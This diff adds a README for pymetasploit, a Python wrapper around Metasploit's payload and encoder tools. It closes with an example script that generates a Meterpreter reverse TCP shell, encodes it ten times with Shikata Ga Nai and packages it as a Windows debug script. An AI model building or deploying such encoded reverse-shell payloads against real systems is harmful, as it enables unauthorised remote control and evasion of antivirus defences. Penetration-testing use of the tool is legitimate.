@@ -1,0 +1,55 @@
+Introduction
+------------
+Pymetasploit is a wrapper for Metasploit written in Python.
+It was written to create and encode payloads from a Python
+script in a simple way.
+
+Features
+--------
+- Create Metasploit payloads calling msfpayload.
+- Encode payloads calling msfencode.
+- Some extra encodings: Base64, Hex, bash script, Windows debugger or xor.
+- Create listeners in a running instance of msfconsole using XMLRPC.
+
+
+Using pymetasploit
+------------------
+- MetasploitEncode.py
+  The class MsfEncode does low level access to the msfencode binary.
+  Currently supports the following encodings:
+  - Base64
+  - Xor
+  - Hex
+  - Shikata Ga Nai (calling msfencode)
+  - Package a binary in a bash script
+  - Package a binary in a Windows Debug script
+
+
+- MetasploitPayload.py
+  The class MsfPayload does low level access to the msfpayload binary.
+  It is used to create standard payloads from Metasploit
+
+- MetasploitWrapper.py MsfWrapper
+  High level access using MsfEncode and MsfPayload classes.
+
+- MetasploitXmlRpcListener.py 
+  The class MsfXmlRpcListener creates listeners in a running instance of msfconsole
+  using XMLRPC.  As a restriction, msfconsole is suposed to be listening on localhost
+  but it can be changed by changing  the login function in the source code.
+
+Example of usage
+----------------
+This simple script creates a Windows debug payload 
+that contains a Meterpreter reverse tcp shell
+encoded with Shikata Ga Nai 10 times.
+
+#! /usr/bin/env python
+
+from pymetasploit.MetasploitWrapper import MsfWrapper
+
+msfObj=MsfWrapper()
+msfObj.winMeterpreterReverseTcpRaw("127.0.0.1","8080")
+msfObj.createPayload()
+msfObj.encodeShikataGaNai(10)
+msfObj.encodeWinDebug()
+print msfObj.getPayload()
